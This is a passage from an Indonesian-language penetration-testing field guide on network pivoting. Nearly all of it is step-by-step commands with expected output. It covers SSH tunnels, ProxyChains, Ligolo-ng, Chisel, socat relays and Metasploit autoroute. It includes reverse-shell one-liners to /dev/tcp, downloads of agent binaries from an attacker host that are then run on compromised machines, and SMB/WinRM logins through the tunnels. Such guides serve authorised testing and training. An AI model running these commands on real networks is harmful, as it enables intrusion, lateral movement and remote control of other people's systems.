    user@$PIVOT_IP
```

**OUTPUT BERHASIL ✅ — Web accessible:**

text

```
HTTP/1.1 200 OK
Server: Apache/2.4.41
Content-Type: text/html
```

➡️ Buka browser ke `http://127.0.0.1:8080` untuk akses web internal target. Lanjut ke workflow yang sesuai (web: [15. Web Reconnaissance & Enumeration Workflow — Master Field Guide](/docs/web-recon)).

---

### Langkah 1.4 — Remote Port Forwarding (Terima Reverse Shell dari Internal)

> Gunakan ini saat target internal perlu mengirim reverse shell ke kamu, tapi tidak bisa langsung reach ATTACKER_IP.

Bash

```
# Setup: Buka port 9001 di PIVOT HOST, forward ke port 4444 di ATTACKER
ssh -R 9001:127.0.0.1:4444 \
    -i ~/pivoting/ssh/pivot_id_rsa \
    -f -N -o StrictHostKeyChecking=no \
    user@$PIVOT_IP

# Setup listener di Attacker
nc -lvnp 4444 &
echo "[*] Listener ready on port 4444"

# Trigger reverse shell dari TARGET INTERNAL (arahkan ke PIVOT IP:9001)
# Di target internal (172.16.1.20):
# bash -i >& /dev/tcp/172.16.1.5/9001 0>&1
```

**Alur komunikasi:**

text

```
[Target Internal] → bash -i >& /dev/tcp/172.16.1.5/9001
                         ↓
[Pivot Host: 172.16.1.5:9001] → SSH tunnel →
                         ↓
[Attacker: 127.0.0.1:4444] ← nc -lvnp 4444
```

**OUTPUT BERHASIL ✅ — Shell masuk:**

text

```
Listening on 0.0.0.0 4444
Connection received on 127.0.0.1 58201
bash: no job control in this shell
www-data@internal-server:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

### Langkah 1.5 — Konfigurasi ProxyChains

Bash

```
# Edit konfigurasi ProxyChains
sudo nano /etc/proxychains4.conf

# Isi yang harus ada (perubahan dari default):
# Hapus '#' dari dynamic_chain, tambah '#' di strict_chain
# Pastikan proxy_dns aktif
# Di bagian [ProxyList] paling bawah: socks5 127.0.0.1 1080
```

**Isi `/etc/proxychains4.conf` yang benar:**

ini

```
dynamic_chain
# strict_chain      ← comment ini
# random_chain      ← comment ini

proxy_dns           ← pastikan aktif (tidak ada #)

tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080
```

Bash

```
# Verifikasi konfigurasi
grep -v "^#" /etc/proxychains4.conf | grep -v "^$"

# Test ProxyChains bekerja
proxychains4 curl -s http://$TARGET_IP/ --connect-timeout 10
```

**OUTPUT BERHASIL ✅ — ProxyChains bekerja:**

text

```
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.20:80-<><>-OK
<!DOCTYPE html>
<html>...
```

**OUTPUT GAGAL ❌ — "Connection refused" atau timeout:**

text

```
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.20:80-<>-TIMEOUT
```

➡️ Cek:

1. Apakah SOCKS tunnel masih aktif? `ss -tlnp | grep 1080`
2. Apakah target port benar-benar open? (cek dari pivot host)
3. Apakah proxychains4.conf menggunakan IP dan port yang benar?

Bash

```
# Debug: jalankan tanpa -q untuk lihat error
ssh -D 1080 user@$PIVOT_IP -N -v 2>&1 | head -30

# Restart tunnel
pkill -f "ssh -D 1080"
ssh -D 1080 user@$PIVOT_IP -f -N -o StrictHostKeyChecking=no
```

---

### Langkah 1.6 — Scanning via ProxyChains

> **⚠️ PENTING:** Nmap via ProxyChains HARUS pakai `-sT -Pn -n`. Jangan pakai `-sS` (akan gagal).

Bash

```
# Port scan target internal via ProxyChains
# -sT = TCP Connect scan (bukan SYN, karena SOCKS tidak support raw packet)
# -Pn = No ping (ICMP tidak bisa lewat SOCKS)
# -n  = No DNS resolution
proxychains4 nmap -sT -Pn -n \
    -p 21,22,80,443,445,3306,3389,5985,8080,8443 \
    $TARGET_IP

# Scan seluruh subnet (lambat, tapi comprehensive)
proxychains4 nmap -sT -Pn -n \
    --top-ports 20 --open \
    $INTERNAL_SUBNET

# Versi lebih cepat dengan -T4
proxychains4 nmap -sT -Pn -n -T4 \
    -p 22,80,443,445,3389 --open \
    $INTERNAL_SUBNET
```

**OUTPUT BERHASIL ✅:**

text

```
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.20:22-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.20:80-<><>-OK

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
445/tcp open  microsoft-ds
```

➡️ Gunakan port yang ditemukan untuk menentukan workflow selanjutnya:

- Port 22 → **`<a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>`** via ProxyChains
- Port 80/443 → **`<a href="/docs/web-recon" class="text-[#00b4d8] hover:underline font-mono font-semibold">15_web_recon_workflow.md</a>`** via ProxyChains
- Port 445 → **`<a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>`** via ProxyChains

Bash

```
# Akses service target via ProxyChains
proxychains4 nxc smb $TARGET_IP -u '' -p ''           # SMB enum
proxychains4 nxc ssh $TARGET_IP -u user -p password    # SSH test
proxychains4 curl http://$TARGET_IP/                   # Web enum
proxychains4 evil-winrm -i $TARGET_IP -u user -p pass  # WinRM
```

---

## ═══════════════════════════════════════

## FASE 2: LIGOLO-NG (RECOMMENDED — PALING POWERFUL)

## ═══════════════════════════════════════

> **Gunakan jika:** Punya root di Parrot OS dan bisa transfer file ke pivot host.  
> **Keunggulan:** Tidak perlu ProxyChains, support `nmap -sS`, akses langsung seperti berada di subnet internal.

### Langkah 2.1 — Install Ligolo-ng di Attacker (Parrot OS)

Bash

```
# Install dependencies dulu
sudo apt update -y && sudo apt install -y jq curl tar gzip unzip

# Download Ligolo-ng (cek versi terbaru)
LIGOLO_VER="v0.6.2"
echo "[*] Downloading Ligolo-ng ${LIGOLO_VER}..."

# Download proxy (controller — dijalankan di attacker)
wget "https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VER}/ligolo-ng_proxy_${LIGOLO_VER#v}_linux_amd64.tar.gz" \
    -O /tmp/ligolo-proxy.tar.gz

tar -xzf /tmp/ligolo-proxy.tar.gz -C /tmp/ proxy
sudo mv /tmp/proxy /usr/local/bin/ligolo-proxy
sudo chmod +x /usr/local/bin/ligolo-proxy

# Download agent (akan ditransfer ke pivot host)
# Linux agent
wget "https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VER}/ligolo-ng_agent_${LIGOLO_VER#v}_linux_amd64.tar.gz" \
    -O /tmp/agent_linux.tar.gz
tar -xzf /tmp/agent_linux.tar.gz -C /tmp/ agent
mv /tmp/agent ~/pivoting/payloads/agent_linux

# Windows agent
wget "https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VER}/ligolo-ng_agent_${LIGOLO_VER#v}_windows_amd64.zip" \
    -O /tmp/agent_win.zip
unzip -q /tmp/agent_win.zip agent.exe -d /tmp/
mv /tmp/agent.exe ~/pivoting/payloads/agent_windows.exe

ls -la ~/pivoting/payloads/
```

**OUTPUT BERHASIL ✅:**

text

```
-rwxr-xr-x  agent_linux
-rwxr-xr-x  agent_windows.exe
```

**OUTPUT GAGAL ❌ — Download gagal (no internet atau URL berubah):**

text

```
ERROR: Failed to establish connection
```

➡️ Cek versi terbaru di: `https://github.com/nicocha30/ligolo-ng/releases`

Bash

```
# Cek versi terbaru via API
curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest | jq -r '.tag_name'
# Update LIGOLO_VER dan jalankan ulang
```

---

### Langkah 2.2 — Setup TUN Interface di Attacker (Satu Kali)

Bash

```
# Buat virtual TUN interface bernama 'ligolo'
sudo ip tuntap add user $USER mode tun ligolo

# Aktifkan interface
sudo ip link set ligolo up

# Verifikasi
ip link show ligolo
```

**OUTPUT BERHASIL ✅:**

text

```
5: ligolo: <NO-CARRIER,POINTOPOINT,MULTICAST,NOARP,UP> mtu 1500 qdisc fq_codel state DOWN
    link/none
```

(State DOWN adalah normal sebelum tunnel aktif)

**OUTPUT GAGAL ❌ — "Operation not permitted":**

text

```
RTNETLINK answers: Operation not permitted
```

➡️ Butuh sudo:

Bash

```
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

---

### Langkah 2.3 — Transfer Agent ke Pivot Host

Bash

```
# Method 1: Python HTTP Server (paling mudah)
cd ~/pivoting/payloads
python3 -m http.server 8080 &
echo "[*] HTTP Server running on port 8080"

# Di pivot host (Linux), download agent:
# wget http://10.10.14.50:8080/agent_linux -O /tmp/agent && chmod +x /tmp/agent

# Method 2: SCP (jika punya SSH key ke pivot)
scp -i ~/pivoting/ssh/pivot_id_rsa \
    ~/pivoting/payloads/agent_linux \
    user@$PIVOT_IP:/tmp/agent_linux

# Method 3: Curl dari pivot host
# curl http://10.10.14.50:8080/agent_linux -o /tmp/agent && chmod +x /tmp/agent

# Method 4: Transfer via netcat (jika tidak ada wget/curl)
# Di attacker:
# nc -lvnp 9999 < ~/pivoting/payloads/agent_linux
# Di pivot host:
# nc 10.10.14.50 9999 > /tmp/agent && chmod +x /tmp/agent

# Jika pivot host adalah Windows:
# Di pivot (PowerShell):
# iwr http://10.10.14.50:8080/agent_windows.exe -OutFile "$env:TEMP\agent.exe"
# certutil -urlcache -split -f http://10.10.14.50:8080/agent_windows.exe %TEMP%\agent.exe
```

**Verifikasi di pivot host:**

Bash

```
# Cek file sudah ada dan executable
ls -la /tmp/agent_linux
file /tmp/agent_linux
```

**OUTPUT BERHASIL ✅:**

text

```
-rwxr-xr-x 1 user user 7234560 Oct 18 17:30 /tmp/agent_linux
/tmp/agent_linux: ELF 64-bit LSB executable
```

**OUTPUT GAGAL ❌ — Permission denied saat wget:**

text

```
wget: can't open '/tmp/agent': Permission denied
```

➡️ Coba direktori lain:

Bash

```
# Cari direktori yang writable
find / -writable -type d 2>/dev/null | grep -v proc | head -10
# Biasanya: /tmp, /dev/shm, /var/tmp
wget http://10.10.14.50:8080/agent_linux -O /dev/shm/agent && chmod +x /dev/shm/agent
```

---

### Langkah 2.4 — Jalankan Ligolo-ng (Full Pipeline)

> **Buka 3 terminal terpisah untuk ini.**

**Terminal 1 — Attacker: Jalankan Proxy Controller**

Bash

```
# Jalankan proxy controller di attacker
ligolo-proxy -selfcert -laddr 0.0.0.0:11601
```

**Output yang diharapkan:**

text

```
WARN[0000] Using self-signed certificates
INFO[0000] Listening on 0.0.0.0:11601
    __    _             __
   / /   (_)___ _____  / /___     ____  ____ _
  / /   / / __ `/ __ \/ / __ \   / __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /  / / / / /_/ /
/_____/_/\__, /\____/_/\____/  /_/ /_/\__, /
        /____/                        /____/
              v0.6.2

ligolo-ng »
```

**Terminal 2 — Pivot Host: Jalankan Agent**

Bash

```
# Di pivot host (Linux)
chmod +x /tmp/agent_linux
/tmp/agent_linux -connect 10.10.14.50:11601 -ignore-cert &

# Di pivot host (Windows)
# .\agent_windows.exe -connect 10.10.14.50:11601 -ignore-cert
```

**Output di pivot host:**

text

```
WARN[0000] Ignoring certificate
INFO[0000] Connection established  addr="10.10.14.50:11601"
```

**Kembali ke Terminal 1 — Attacker: Konfigurasi Session**

text

```
# Agent join terdeteksi di konsol ligolo-proxy:
ligolo-ng » INFO[0045] Agent joined: user@pivot-box - 10.10.11.100:49210

# Lihat semua session
ligolo-ng » session
? Select a session: 1 - user@pivot-box - 10.10.11.100:49210

# Lihat interface di pivot host
[Agent : user@pivot-box] » ifconfig
┌─────────────────────────────────────────────┐
│ Interface 1: eth0 10.10.11.100/24           │
│ Interface 2: eth1 172.16.1.5/24 ← Internal! │
└─────────────────────────────────────────────┘

# Mulai tunnel
[Agent : user@pivot-box] » start
INFO[0080] Starting tunnel to user@pivot-box
```

**Terminal 3 — Attacker: Tambahkan Route**

Bash

```
# Tambahkan routing ke subnet internal via interface ligolo
sudo ip route add 172.16.1.0/24 dev ligolo

# Verifikasi route terpasang
ip route | grep ligolo
```

**OUTPUT BERHASIL ✅ — Route terpasang:**

text

```
172.16.1.0/24 dev ligolo scope link
```

**Test akses langsung (tanpa ProxyChains!):**

Bash

```
# Ping target internal langsung
ping -c 3 172.16.1.20

# Nmap SYN scan langsung (tidak perlu proxychains!)
nmap -sS -Pn -p 22,80,445,3306,3389 172.16.1.20

# Akses web langsung
curl http://172.16.1.20/

# SMB enum langsung
nxc smb 172.16.1.20 -u '' -p ''
```

**OUTPUT BERHASIL ✅ — Akses langsung ke subnet internal:**

text

```
PING 172.16.1.20: 64 bytes from 172.16.1.20: icmp_seq=0 ttl=64 time=2.1 ms

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
445/tcp open  microsoft-ds
```

**OUTPUT GAGAL ❌ — "Network unreachable" setelah route ditambah:**

text

```
connect: Network is unreachable
```

➡️ Tunnel belum aktif atau route salah:

Bash

```
# Cek apakah tunnel sudah distart di konsol ligolo
# Pastikan sudah ketik 'start' di sesi yang dipilih

# Cek interface ligolo status
ip link show ligolo
# Harus UP: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP>

# Jika masih DOWN, coba restart tunnel
# Di konsol ligolo: stop → start
```

**OUTPUT GAGAL ❌ — Agent tidak bisa connect ke proxy:**

text

```
ERRO[0000] Connection failed: dial tcp 10.10.14.50:11601: connect: connection refused
```

➡️ Proxy belum jalan atau firewall blokir port:

Bash

```
# Cek apakah ligolo-proxy sudah running
ps aux | grep ligolo-proxy
ss -tlnp | grep 11601

# Jika port 11601 diblokir, coba port lain (443, 8443)
ligolo-proxy -selfcert -laddr 0.0.0.0:443
# Di pivot: ./agent_linux -connect 10.10.14.50:443 -ignore-cert
```

---

### Langkah 2.5 — Receive Reverse Shell via Ligolo (dari Target Internal)

> Saat mengeksploit target internal dan butuh reverse shell kembali ke attacker.

Bash

```
# Di konsol ligolo-ng, tambahkan listener di pivot host
[Agent : user@pivot-box] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp

# Output:
# INFO[0120] Listener created on 0.0.0.0:4444

# Di Terminal Attacker: pasang listener lokal
nc -lvnp 4444

# Di Target Internal (172.16.1.20): trigger reverse shell ke PIVOT IP (172.16.1.5)
# bash -i >& /dev/tcp/172.16.1.5/4444 0>&1
# python3 -c 'import socket,subprocess,os;...'
```

**OUTPUT BERHASIL ✅ — Shell masuk:**

text

```
Listening on 0.0.0.0 4444
Connection received on 127.0.0.1 49201
bash: no job control in this shell
www-data@internal-target:~$
```

---

### Langkah 2.6 — Ligolo Double Pivot (Multi-Tier Subnet)

> Skenario: Attacker → Pivot 1 → Pivot 2 → Target Terdalam

Bash

```
# STEP 1: Di konsol Ligolo (sesi Pivot 1 aktif)
# Buat listener di Pivot 1 yang forward ke Attacker controller
[Agent : pivot1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

# STEP 2: Transfer agent ke Pivot 2 (via Pivot 1)
# Di Pivot 1: wget http://ATTACKER_IP:8080/agent_linux -O /tmp/agent2

# STEP 3: Di Pivot 2, connect ke Pivot 1 (bukan langsung ke Attacker)
# /tmp/agent2 -connect 172.16.1.5:11601 -ignore-cert &

# STEP 4: Di konsol Ligolo Attacker, session baru muncul
ligolo-ng » session
# Pilih session Pivot 2

[Agent : pivot2] » ifconfig
# Ditemukan: 192.168.100.0/24 (subnet terdalam)

[Agent : pivot2] » start

# STEP 5: Tambahkan route ke subnet terdalam
sudo ip route add 192.168.100.0/24 dev ligolo

# Sekarang bisa akses 192.168.100.0/24 langsung!
nmap -sS -Pn 192.168.100.50
```

---

## ═══════════════════════════════════════

## FASE 3: CHISEL REVERSE TUNNEL

## ═══════════════════════════════════════

> **Gunakan jika:** SSH tidak tersedia, firewall blokir semua inbound, tapi pivot host bisa connect keluar via HTTP/HTTPS.

### Langkah 3.1 — Install & Persiapkan Chisel

Bash

```
# Download Chisel untuk attacker (Linux)
CHISEL_VER=$(curl -s https://api.github.com/repos/jpillora/chisel/releases/latest | jq -r '.tag_name')
echo "[*] Chisel version: $CHISEL_VER"

wget "https://github.com/jpillora/chisel/releases/download/${CHISEL_VER}/chisel_${CHISEL_VER#v}_linux_amd64.gz" \
    -O /tmp/chisel.gz

gunzip -f /tmp/chisel.gz
chmod +x /tmp/chisel
sudo mv /tmp/chisel /usr/local/bin/chisel

chisel --version

# Download juga untuk Windows (untuk pivot Windows)
wget "https://github.com/jpillora/chisel/releases/download/${CHISEL_VER}/chisel_${CHISEL_VER#v}_windows_amd64.gz" \
    -O ~/pivoting/payloads/chisel_windows.gz
gunzip ~/pivoting/payloads/chisel_windows.gz
mv ~/pivoting/payloads/chisel_windows ~/pivoting/payloads/chisel.exe

ls -la ~/pivoting/payloads/
```

**OUTPUT BERHASIL ✅:**

text

```
1.10.0
```

---

### Langkah 3.2 — Jalankan Chisel Server di Attacker

Bash

```
# Terminal 1 — Attacker: Jalankan Chisel server
# --reverse: Izinkan client membuat listener di server side
chisel server --port 8001 --reverse -v
```

**Output:**

text

```
2023/10/18 17:30:00 server: Reverse tunnelling enabled
2023/10/18 17:30:00 server: Listening on http://0.0.0.0:8001
```

**OUTPUT GAGAL ❌ — Port 8001 diblokir:**

text

```
# Client tidak bisa connect
```

➡️ Coba port yang lebih umum diizinkan firewall:

Bash

```
# Gunakan port 80 (HTTP) atau 443 (HTTPS)
sudo chisel server --port 80 --reverse -v
# atau
sudo chisel server --port 443 --reverse -v --tls-key server.key --tls-cert server.crt
```

---

### Langkah 3.3 — Transfer Chisel ke Pivot Host

Bash

```
# Dari attacker: hosting chisel binary
cd /usr/local/bin && python3 -m http.server 8080 &

# Di pivot host (Linux):
wget http://10.10.14.50:8080/chisel -O /tmp/chisel
chmod +x /tmp/chisel

# Di pivot host (Windows):
# iwr http://10.10.14.50:8080/chisel.exe -OutFile "$env:TEMP\chisel.exe"
```

---

### Langkah 3.4 — Connect Chisel Client dari Pivot Host

Bash

```
# Skenario A: Full Reverse SOCKS5 Proxy (PALING UMUM)
# Di pivot host:
/tmp/chisel client 10.10.14.50:8001 R:socks &

# Di attacker terminal (setelah client connect):
# Output di server:
# 2023/10/18 17:30:12 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

**OUTPUT BERHASIL ✅ — Di terminal chisel server attacker:**

text

```
2023/10/18 17:30:12 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening on 127.0.0.1:1080...
```

➡️ SOCKS5 proxy aktif di `127.0.0.1:1080`! Update proxychains dan mulai scanning:

Bash

```
# Verifikasi SOCKS listening
ss -tlnp | grep 1080

# Scan via proxychains
proxychains4 nmap -sT -Pn -n -p 22,80,445 $TARGET_IP
proxychains4 curl http://$TARGET_IP/
```

Bash

```
# Skenario B: Forward port spesifik
# Di pivot host:
/tmp/chisel client 10.10.14.50:8001 R:9090:172.16.1.20:80 &

# Di attacker:
curl http://127.0.0.1:9090/   # Akses web internal

# Skenario C: Multiple ports sekaligus
/tmp/chisel client 10.10.14.50:8001 \
    R:socks \
    R:8080:172.16.1.20:80 \
    R:3306:172.16.1.20:3306 &
```

**OUTPUT GAGAL ❌ — "Connection refused" saat client connect:**

text

```
2023/10/18 17:30:10 client: Failed to connect: dial tcp: connection refused
```

➡️ Cek:

1. Apakah chisel server sudah running di attacker?
2. Apakah IP attacker benar (bukan 127.0.0.1)?
3. Apakah port 8001 bisa diakses dari pivot (coba `curl http://10.10.14.50:8001`)?

Bash

```
# Dari pivot, test konektivitas ke attacker
curl -s http://10.10.14.50:8001/ --connect-timeout 5
# Jika gagal: gunakan port lain atau cek firewall

# Dari attacker, cek apakah server running
ps aux | grep chisel
ss -tlnp | grep 8001
```

---

### Langkah 3.5 — Chisel Double Pivot

> Pivot 1 → Pivot 2 → Target Terdalam

Bash

```
# STEP 1: Attacker menjalankan chisel server
chisel server --port 8001 --reverse

# STEP 2: Pivot 1 connect ke Attacker (membuka SOCKS di Attacker:1080)
# Di Pivot 1:
./chisel client 10.10.14.50:8001 R:1080:socks &

# STEP 3: Pivot 1 juga jalankan chisel server untuk Pivot 2
# Di Pivot 1:
./chisel server --port 8002 --reverse &

# STEP 4: Pivot 2 connect ke Pivot 1 (melalui proxychains atau SSH)
# Di Pivot 2:
./chisel client 172.16.1.5:8002 R:1081:socks &

# STEP 5: Forward SOCKS dari Pivot 1:1081 ke Attacker
# Di Pivot 1:
./chisel client 10.10.14.50:8001 R:1081:127.0.0.1:1081 &

# STEP 6: Update proxychains di Attacker
# /etc/proxychains4.conf:
# [ProxyList]
# socks5 127.0.0.1 1080  ← untuk subnet via Pivot 1
# socks5 127.0.0.1 1081  ← untuk subnet via Pivot 2
```

---

## ═══════════════════════════════════════

## FASE 4: NETCAT / SOCAT RELAY (DARURAT)

## ═══════════════════════════════════════

> **Gunakan jika:** Tidak ada SSH, tidak bisa install chisel/ligolo, hanya ada nc/socat/bash.

### Langkah 4.1 — Netcat Named Pipe Forwarding

Bash

```
# Di Pivot Host: Buat named pipe relay
# Forward semua traffic port 8080 di pivot ke port 80 di target internal
mkfifo /tmp/pivot_pipe

nc -lvnp 8080 < /tmp/pivot_pipe | nc 172.16.1.20 80 > /tmp/pivot_pipe &

# Di Attacker: Akses via pivot host
curl http://$PIVOT_IP:8080/
```

**OUTPUT BERHASIL ✅:**

text

```
HTTP/1.1 200 OK
Server: Apache/2.4.41
```

**OUTPUT GAGAL ❌ — nc tidak support -e atau fifo tidak bekerja:**

text

```
nc: invalid option -- 'l'
```

➡️ Versi netcat berbeda:

Bash

```
# Coba ncat (nmap's netcat)
ncat -lvnp 8080 -c "ncat 172.16.1.20 80" &

# Atau pakai bash /dev/tcp
# Di pivot host:
while true; do
    nc -lvnp 8080 -e bash -c "bash -i /dev/tcp/172.16.1.20/80" 2>/dev/null
done &
```

---

### Langkah 4.2 — Socat Port Forwarding (Lebih Stabil)

Bash

```
# Install socat jika belum ada
sudo apt install -y socat

# Method 1: Simple TCP forward (port 8888 pivot → port 80 target internal)
# Di Pivot Host:
socat TCP-LISTEN:8888,fork,reuseaddr TCP:172.16.1.20:80 &

# Akses dari Attacker:
curl http://$PIVOT_IP:8888/

# Method 2: Multi-service forward sekaligus
# Di Pivot Host:
socat TCP-LISTEN:8080,fork,reuseaddr TCP:172.16.1.20:80 &    # Web
socat TCP-LISTEN:3306,fork,reuseaddr TCP:172.16.1.20:3306 &  # MySQL
socat TCP-LISTEN:4450,fork,reuseaddr TCP:172.16.1.20:445 &   # SMB

# Method 3: Relay reverse shell
# Di Pivot Host (relay dari target ke attacker):
socat TCP-LISTEN:5555,fork TCP:10.10.14.50:4444 &

# Di Attacker: pasang listener
nc -lvnp 4444

# Di Target Internal: reverse shell ke pivot
# bash -i >& /dev/tcp/172.16.1.5/5555 0>&1
```

**OUTPUT BERHASIL ✅ — Socat relay aktif:**

text

```
# Akses web target internal via socat
curl http://10.10.11.100:8888/
# Response dari web server di 172.16.1.20
```

---

## ═══════════════════════════════════════

## FASE 5: METASPLOIT PIVOTING

## ═══════════════════════════════════════

> **Gunakan jika:** Sudah punya meterpreter shell di pivot host.

### Langkah 5.1 — Autoroute + SOCKS via Meterpreter

Bash

```
# Di Metasploit, setelah dapat meterpreter session di pivot host

# Method 1: Langsung dari meterpreter prompt
meterpreter > run autoroute -s 172.16.1.0/24
# Output: [*] Adding a route to 172.16.1.0/255.255.255.0...
# [+] Added route to 172.16.1.0/255.255.255.0 via 10.10.11.100

meterpreter > background

# Method 2: Via post module
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.1.0
msf6 post(multi/manage/autoroute) > run

# Cek route yang aktif
msf6 > route print

# Setup SOCKS proxy server di Metasploit
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run -j

# Update proxychains untuk pakai port 9050
# /etc/proxychains4.conf → socks5 127.0.0.1 9050
```

**OUTPUT BERHASIL ✅ — SOCKS aktif:**

text

```
[*] Auxiliary module running as background job 2
[*] Starting the SOCKS proxy server
```

Bash

```
# Gunakan proxychains dengan port MSF SOCKS
proxychains4 -f /etc/proxychains4.conf nmap -sT -Pn 172.16.1.20
```

---

## ═══════════════════════════════════════

## FASE 6: INTEGRASI TOOLS MELALUI TUNNEL

## ═══════════════════════════════════════

### Langkah 6.1 — Nmap Scanning via Tunnel

Bash

```
# VIA PROXYCHAINS (SSH/Chisel tunnel)
# WAJIB: -sT (bukan -sS), -Pn (no ping), -n (no DNS)
proxychains4 nmap -sT -Pn -n \
    -p 21,22,80,443,445,1433,3306,3389,5985,8080,8443 \
    --open -T3 \
    $TARGET_IP

# Scan subnet luas (lambat)
proxychains4 nmap -sT -Pn -n --top-ports 20 --open $INTERNAL_SUBNET

# VIA LIGOLO-NG (langsung, tanpa proxychains)
# Bisa pakai -sS (SYN scan), OS detection, UDP
nmap -sS -Pn -sV -O -p- $TARGET_IP --open
nmap -sU -Pn --top-ports 20 $TARGET_IP

# Simpan hasil scan
nmap -sS -Pn -sV -p 22,80,443,445 $TARGET_IP -oN ~/pivoting/loot/internal_scan.txt
```

---

### Langkah 6.2 — Web Testing via Tunnel

Bash

```
# Via ProxyChains
proxychains4 curl -s http://$TARGET_IP/
proxychains4 curl -s -k https://$TARGET_IP/
proxychains4 ffuf -u http://$TARGET_IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
proxychains4 gobuster dir -u http://$TARGET_IP/ -w /usr/share/wordlists/dirb/common.txt

# Via Ligolo-ng (langsung)
curl -s http://$TARGET_IP/
ffuf -u http://$TARGET_IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

# Burp Suite via SOCKS proxy
# Settings → Network → Connections → SOCKS Proxy
# Host: 127.0.0.1, Port: 1080, Type: SOCKS5
# Centang: Do DNS lookups over SOCKS proxy
```

---

### Langkah 6.3 — SMB/Service Testing via Tunnel

Bash

```
# Via ProxyChains
proxychains4 nxc smb $TARGET_IP -u '' -p '' --shares
proxychains4 nxc smb $TARGET_IP -u 'admin' -p 'Password123!' --shares
proxychains4 smbclient -N -L //$TARGET_IP/

# Via Ligolo-ng (langsung)
nxc smb $TARGET_IP -u '' -p '' --shares
smbclient -N -L //$TARGET_IP/
evil-winrm -i $TARGET_IP -u admin -p 'Password123!'

# SSH ke target internal
proxychains4 ssh user@$TARGET_IP
# atau via Ligolo:
ssh user@$TARGET_IP
```

---

## ═══════════════════════════════════════

## FASE 7: SKENARIO KHUSUS & PROBLEM SOLVING

## ═══════════════════════════════════════

### Skenario A — Pivot dari Windows (No Tools)

> Kamu dapat shell di Windows target dan perlu pivot.

PowerShell

```
# Di Windows shell — cek network interfaces
ipconfig /all

# Cek routing table
route print

# Cek ARP cache
arp -a

# Host discovery di subnet internal (PowerShell)
$subnet = "172.16.1"
1..254 | ForEach-Object {
    $ip = "$subnet.$_"
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet -TimeoutSeconds 1) {
        Write-Host "[+] Alive: $ip"
    }
}

# TCP port probe (PowerShell, tidak butuh tool tambahan)
$ports = @(22,80,443,445,3389)
$target = "172.16.1.20"
foreach ($port in $ports) {
    $tcp = New-Object System.Net.Sockets.TcpClient
    $conn = $tcp.BeginConnect($target, $port, $null, $null)
    $wait = $conn.AsyncWaitHandle.WaitOne(1000)
    if ($wait -and !$tcp.Client.Connected -eq $false) {
        Write-Host "[+] Open: $target:$port"
    }
    $tcp.Close()
}
```

---

### Skenario B — Egress Filtering Ketat (Hanya Port 443 Allowed)

Bash

```
# Gunakan Chisel di port 443 (HTTPS)
# Di attacker (butuh sudo untuk port <1024)
sudo chisel server --port 443 --reverse --tls-key /etc/ssl/private/ssl-cert-snakeoil.key \
    --tls-cert /etc/ssl/certs/ssl-cert-snakeoil.pem

# Di pivot host:
./chisel client --tls-skip-verify https://10.10.14.50:443 R:socks &

# Jika 443 juga diblokir, coba DNS tunneling (extreme case)
# iodine/dnscat2 untuk tunnel via DNS
```

---

### Skenario C — Cleanup Setelah Selesai

Bash

```
# Cleanup SSH tunnels
ps aux | grep -E "ssh -[LRD]"
pkill -f "ssh -D 1080"
pkill -f "ssh -L"
pkill -f "ssh -R"

# Cleanup Ligolo-ng
sudo ip route del $INTERNAL_SUBNET dev ligolo 2>/dev/null
sudo ip link set ligolo down 2>/dev/null
sudo ip tuntap del ligolo mode tun 2>/dev/null

# Cleanup Chisel
pkill -f "chisel server"
pkill -f "chisel client"

# Cleanup Socat
pkill -f "socat TCP-LISTEN"

# Cleanup file di pivot host (dari remote)
ssh user@$PIVOT_IP "rm -f /tmp/agent_linux /tmp/chisel /tmp/pivot_pipe"

# Verifikasi bersih
ss -tlnp | grep -E "1080|8001|9050|11601"
ps aux | grep -E "chisel|ligolo|socat" | grep -v grep
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`bind: Address already in use`|Port lokal sudah dipakai|`ss -tulpn \| grep PORT` → `kill -9 $(lsof -ti:PORT)`|
|ProxyChains timeout|SOCKS tunnel belum aktif atau salah port|`ss -tlnp \| grep 1080` → cek proxychains4.conf|
|`nmap -sS` gagal via proxychains|SYN scan tidak bisa lewat SOCKS|Ganti ke `-sT -Pn -n`|
|Chisel: `connection refused`|Server belum running atau port diblokir|Cek server aktif, coba port 80/443|
|Ligolo: `interface tun not found`|TUN interface belum dibuat|`sudo ip tuntap add user $USER mode tun ligolo`|
|Ligolo: route tidak merespons|Lupa `start` atau lupa tambah route|Di konsol: `start` → `sudo ip route add SUBNET dev ligolo`|
